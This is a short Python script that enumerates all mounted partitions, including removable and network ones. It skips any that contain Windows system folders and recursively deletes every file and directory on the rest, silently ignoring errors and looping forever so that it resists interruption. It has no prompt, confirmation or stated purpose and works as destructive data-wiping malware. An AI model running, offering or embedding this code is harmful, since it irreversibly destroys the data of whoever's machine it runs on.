import os
import psutil

def has_windows_boot(partition):
    windows_path = os.path.join(partition.mountpoint, "Windows")
    boot_path = os.path.join(partition.mountpoint, "ProgramData")
    return os.path.exists(windows_path) and os.path.exists(boot_path)

def format_partition(partition):
    try:
        for root, dirs, files in os.walk(partition.mountpoint, topdown=False):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    os.remove(file_path)
                except Exception as e:
                    None
            for dir in dirs:
                dir_path = os.path.join(root, dir)
                try:
                    os.rmdir(dir_path)
                except Exception as e:
                    None
    except Exception as e:
        None

while True:
    try:
        def list_disks():
            partitions = psutil.disk_partitions(all=True)

            for partition in partitions:
                if has_windows_boot(partition):
                    None
                else:
                    format_partition(partition)

        if __name__ == "__main__":
            list_disks()
    except KeyboardInterrupt:
        None